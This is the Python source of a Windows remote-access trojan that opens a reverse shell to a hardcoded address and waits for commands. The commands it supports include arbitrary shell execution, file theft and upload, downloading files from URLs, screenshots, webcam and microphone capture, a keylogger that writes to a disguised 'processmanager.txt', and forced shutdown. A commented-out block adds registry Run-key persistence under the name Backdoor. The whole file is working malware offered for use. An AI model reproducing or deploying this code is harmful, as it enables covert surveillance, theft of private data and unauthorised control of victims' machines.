from base64 import b64encode,b64decode
from os import chdir, environ, path, remove, listdir, name, system
from shutil import copyfile
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE, call, check_output
import subprocess
from threading import Thread,Timer
from sys import executable, exit, argv
from time import sleep,time
from json import loads, dumps
from platform import platform
import pyautogui
import cv2
import requests
import ctypes
import pynput
import pyaudio
import datetime
import wave
import re
 
class SafeSocket:

    def __init__(self, sock):
        self.sock = sock

    def send(self, data):
        json_data = dumps(data)
        self.sock.send(json_data)

    def recv(self):
        data = ""
        while True:
            try:
                data = data + self.sock.recv(1024)
                return loads(data)
            except ValueError:
                continue

    def callback(self, data):
        self.send(data)
        return self.recv()

class keylogger():
    def __init__(self):
        self.log = ""
        self.path = environ["appdata"] + "\\processmanager.txt"

        
    def process_keys(self,key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.right:
                self.log = self.log + ""
            elif key == key.left:
                self.log = self.log + ""
            elif key == key.up:
                self.log =self.log + ""
            elif key == key.down:
                self.log = self.log + ""
            elif key == key.right:
                self.log = self.log + ""
            else:
                self.log = self.log + str(key) + " "

    def report(self):
        fin = open(self.path,"w")
        fin.write(self.log)
        log = ""
        fin.close()
        timer = Timer(10,self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

class ReverseShell():
    """Initiate backdoor and socket variable"""

    def connect(self):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.safe_sock = SafeSocket(self.sock)
        self.sock.connect(('192.168.43.150',54321))
    
    def run(self):
        while True:
            sleep(20)
            try:
                self.connect()
                self.shell()
            except:           
                self.run()

    def download(url):
        get_response = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name,"wb") as out_file:
            out_file.write(get_response.content)

    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def change_background(self):
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, environ["appdata"] + "\\wall.jpg", 3)
    
    def webcam(self):
        try:
            c = cv2.VideoCapture(0)
            return_value,image = c.read()
            cv2.imwrite("camera.png",image)
            with open("camera.png",'rb') as sc:
                self.safe_sock.send(b64encode(sc.read()))
            remove("camera.png")
        except Exception as e:
            self.safe_sock.send(str(e))

    def vidcap(self):
        try:
            vid_capture = cv2.VideoCapture(0)
            vid_cod = cv2.VideoWriter_fourcc(*'XVID')
            output = cv2.VideoWriter("camvid.mp4", vid_cod, 20.0, (640,480))
            t_end = time() + 0o3 * 0o5
            while time() < t_end:
               ret,frame = vid_capture.read()
               output.write(frame)
     
            vid_capture.release()
            output.release()
            cv2.destroyAllWindows()
            with open("camvid.mp4",'rb') as sc:
                self.safe_sock.send(b64encode(sc.read()))
            remove("camvid.mp4")
        except Exception as e:
            self.safe_sock.send(str(e))
    

    def voicerecorder(self):
        try:
            sample_format = pyaudio.paInt16
            chunk,chanels,sampl_rt,seconds = 1024,2, 44400, 10
            pa = pyaudio.PyAudio()
            stream = pa.open(format = sample_format,channels = chanels,rate = sampl_rt,
            input = True,frames_per_buffer=chunk)
            frames = []
            for i in range(0,int(sampl_rt/chunk * seconds)):
                data = stream.read(chunk)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            sf = wave.open("recording.wav","wb")
            sf.setnchannels(chanels)
            sf.setsampwidth(pa.get_sample_size(sample_format))
            sf.setframerate(sampl_rt)
            sf.writeframes(b"".join(frames))
            sf.close()
            with open("recording.wav",'rb') as sc:
                    self.safe_sock.send(b64encode(sc.read()))
            remove("recording.wav")

        except Exception as e:
            self.safe_sock.send("failed to record audio...")
    
    def playaudio(self):
        try:
            chunk = 1024
            aud = wave.open("c:/users/jsann/Desktop/aud.wav","rb")
            # First copy a audio named sys.wave to the location Appdata/Roaming
            pa = pyaudio.PyAudio()
            stream = pa.open(format=pa.get_format_from_width(aud.getsampwidth()),
            channels = aud.getnchannels(),rate = aud.getframerate(),output = True)

            rd_data = aud.readframes(chunk)
            self.safe_sock.send("Playing audio in target machine...")
            while rd_data !="":
                stream.write(rd_data)
                rd_data = aud.readframes(chunk)
            stream.stop_stream()
            stream.close()
            pa.terminate()

        except:
            self.safe_sock.send("unable to play audio..")
    
    
    def cursor_down(self):
        try:
            t_end = time() + 0o3 * 0o5
            while time() < t_end:
                pyautogui.moveTo(600, 200)
            self.safe_sock.send('cursor disabled')
        except:
            self.safe_sock.send("Unable to kill cursor")
    
          
    def return_proc(self, command):
        proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        stdout = proc.stdout.read() + proc.stderr.read()
        payload = stdout.decode("utf-8")
        self.safe_sock.send(payload)
 
    def shell(self):
        while True:
            command = self.safe_sock.recv()
            if command == "exit":
                break
            elif command == "help":
                help_options = '''
                                     Author:luv 

                                     *  * *  *
                                    *    *    *
                                    *         *
                                      *     *
                                         *

                    --you can execute the following commands from the server.py--

                     exit         --> Exit current session from target
                     download     --> Download a file from Target PC
                     upload       --> Upload a file into Target PC
                     get url      --> Dowload a file from the specified url
                     start        --> Start a program in target PC
                     screenshot   --> Take a Screenshot on target PC and send to server
                     wallpaper    --> Change the Wallpaper in Target PC
                     killcursor   --> Make the cursor dead for few seconds
                     webcam       --> Take a snap in target pc and send to server
                     wcvid        --> Record video in target PC and send to server
                     voicerec     --> record voice from target PC and send to server
                     playaud      --> Play Audio in target PC
                     shutdown     --> Shutdown Target PC
                     restart      --> Restart target PC
                     privilige    --> Check for Administrator priviliges
                     os           --> get os of targe PC
                     keylog_start --> Start keystrokes log
                     keylog_dump  --> send the keystrokes file to target PC                                 '''

                self.safe_sock.send(help_options)

            elif command[:7] == "sendall":
                Popen(command[8:],shell=True)

            elif command[:2] == "cd" and len(command) > 1:
                try:
                    chdir(command[3:])
                except:
                    continue

            elif command[:8] == 'download':
                with open(command[9:],"rb") as file:
                    self.safe_sock.send(b64encode(file.read()))

            elif command[:6] == 'upload':
                with open(command[7:],'wb') as file1:
                    file_data = self.safe_sock.recv()
                    file1.write(b64decode(file_data))

            elif command[:3] =="get":
                try:
                    self.download(command[4:])
                    self.safe_sock.send("Downloaded File from specified url")
                except:
                    self.safe_sock.send("Failed to Download that file")

            elif command[:5] == "start":
                try:
                    Popen(command[6:],shell = True)
                    self.safe_sock.send("started")
                except:
                    self.safe_sock.send("Falied to Start")

            elif command[:10] == "screenshot":
                try:
                    im=pyautogui.screenshot()
                    im.save("screen.png")
                    with open("screen.png",'rb') as sc:
                        self.safe_sock.send(b64encode(sc.read()))
                    remove("screen.png")
                except Exception as e:
                    self.safe_sock.send(str(e))

            elif command[:9] == "wallpaper":
                try:
                    self.change_background()
                    self.safe_sock.send("Succesfully changed Wallpaper")
                except:
                    self.safe_sock.send("Wallpaper Not Changed")

            elif command[:10] =="killcursor":
                self.cursor_down()
            
            elif command[:6] == "webcam":
                self.webcam()
            
            elif command[:5] == "wcvid":
                self.vidcap()

            elif command[:8] == "voicerec":
                self.voicerecorder()

            elif command[:7] == "playaud":
                self.playaudio()
            
            elif command[:8] == "shutdown":
                system('shutdown /s /t 1')

            elif command[:7] == "restart":
                system('shutdown /r /t 1')

            elif command[:9] == "privilige":
               status =  self.is_admin()
               if status:
                   self.safe_sock.send("Running as Admin priviliges")
               else:
                   self.safe_sock.send("Running as user priviliges")

            elif command[:2] == 'os':
                o_sys= platform()
                self.safe_sock.send(o_sys)

            elif command[:12] == 'keylog_start':
                t1 = Thread(target = keylogger().start)
                t1.start()
            elif command[:11] == "keylog_dump":
                fn = open(environ["appdata"] + "\\processmanager.txt",'r+')
                self.safe_sock.send(fn.read())
                fn.truncate(0)
                fn.seek(0)
            else:
                self.return_proc(command)
                
# location = environ["appdata"] + "\\windows64.exe"
# if not path.exists(location):
#     copyfile(executable,location)
#     call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

ReverseShell().run()
